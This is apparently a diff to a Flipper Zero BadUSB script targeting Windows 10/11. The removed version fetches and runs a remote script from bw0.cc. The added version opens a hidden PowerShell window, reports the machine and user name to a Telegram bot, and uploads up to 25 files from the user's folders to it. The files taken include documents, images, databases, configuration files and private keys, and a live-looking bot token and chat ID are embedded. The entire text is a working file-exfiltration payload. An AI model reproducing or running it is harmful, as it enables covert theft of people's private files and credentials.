@@ -1,19 +1,94 @@
+REM ============================================
+REM Flipper Zero - Universal File Exfiltrator
+REM Author: RFX | AOIRUSRA Framework
+REM Description: Scans user folders for documents, 
+REM pictures, logs, PDFs and sends to Telegram
+REM Target: Windows 10/11
+REM ============================================
 
-REM Title: beigeworm's Exfiltrate files to Telegram
-REM Author: @beigeworm
-REM Description: This script searches the users folder fot pictures, documents, logs, PDFs and more, then sends its all to a dropbox account.
-REM Target: Windows 10
-
-REM *SETUP*
-REM replace TELEGRAM_TOKEN with your Telegram Token.
-
-REM some setup for dukie script
-DEFAULT_DELAY 100
-
-REM open powershell (remove -W Hidden to show the window)
-DELAY 1000
+DELAY 4000
 GUI r
-DELAY 750
-STRING powershell -Ep Bypass -C $tg='TELEGRAM_TOKEN'; iex (irm bw0.cc/extg)
-ENTER
+DELAY 800
+STRING powershell -NoP -W H -Exec B -C "
+# Telegram Configuration
+`$BOT_TOKEN = '8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI'
+`$CHAT_ID = '6614794141'
+`$API_URL = 'https://api.telegram.org/bot' + `$BOT_TOKEN
 
+# Start notification
+`$START_MSG = '[Flipper] System: ' + `$env:COMPUTERNAME + ' | User: ' + `$env:USERNAME
+curl.exe `"`$API_URL/sendMessage?chat_id=`$CHAT_ID&text=`$START_MSG`"
+
+# Folders to scan (user-accessible locations)
+`$SCAN_PATHS = @(
+    `$env:USERPROFILE + '\\Desktop',
+    `$env:USERPROFILE + '\\Documents',
+    `$env:USERPROFILE + '\\Downloads',
+    `$env:USERPROFILE + '\\Pictures',
+    `$env:USERPROFILE + '\\Videos',
+    `$env:USERPROFILE + '\\OneDrive'
+)
+
+# File types from original description + more
+`$FILE_TYPES = @(
+    # Documents
+    '*.txt', '*.log', '*.doc', '*.docx', '*.pdf', '*.rtf', '*.odt',
+    # Spreadsheets
+    '*.xls', '*.xlsx', '*.csv', '*.ods',
+    # Images
+    '*.jpg', '*.jpeg', '*.png', '*.gif', '*.bmp', '*.tiff',
+    # Configurations & Databases
+    '*.db', '*.sqlite', '*.cfg', '*.conf', '*.ini', '*.json', '*.xml',
+    # Certificates & Keys
+    '*.cer', '*.key', '*.pem', '*.pfx',
+    # Archives
+    '*.zip', '*.rar', '*.7z', '*.tar', '*.gz'
+)
+
+`$TOTAL_SENT = 0
+`$MAX_FILES = 25  # Safety limit
+
+foreach (`$PATH in `$SCAN_PATHS) {
+    if (`$TOTAL_SENT -ge `$MAX_FILES) { break }
+    
+    if (Test-Path `$PATH -ErrorAction SilentlyContinue) {
+        foreach (`$TYPE in `$FILE_TYPES) {
+            if (`$TOTAL_SENT -ge `$MAX_FILES) { break }
+            
+            `$FILES = Get-ChildItem -Path `$PATH -Filter `$TYPE `
+                -File -Recurse -ErrorAction SilentlyContinue -Depth 2 `
+                | Select-Object -First 3
+            
+            foreach (`$FILE in `$FILES) {
+                if (`$TOTAL_SENT -ge `$MAX_FILES) { break }
+                
+                # Check file size (Telegram limit: 50MB)
+                if (`$FILE.Length -lt 45MB) {
+                    try {
+                        curl.exe -s -F `"chat_id=`$CHAT_ID`" `
+                                 -F `"document=@`$(`$FILE.FullName)`" `
+                                 `"`$API_URL/sendDocument`"
+                        `$TOTAL_SENT++
+                        Start-Sleep -Milliseconds 800
+                    } catch {
+                        # Silent error handling
+                    }
+                }
+            }
+        }
+    }
+}
+
+# Final report
+`$REPORT = '[Flipper] Scan Complete' + \"`n\" +
+          'Files Sent: ' + `$TOTAL_SENT + \"`n\" +
+          'Computer: ' + `$env:COMPUTERNAME + \"`n\" +
+          'User: ' + `$env:USERNAME + \"`n\" +
+          'Time: ' + (Get-Date -Format 'HH:mm:ss')
+
+curl.exe `"`$API_URL/sendMessage?chat_id=`$CHAT_ID&text=`$REPORT`"
+
+# Clean exit
+exit 0
+"
+ENTER
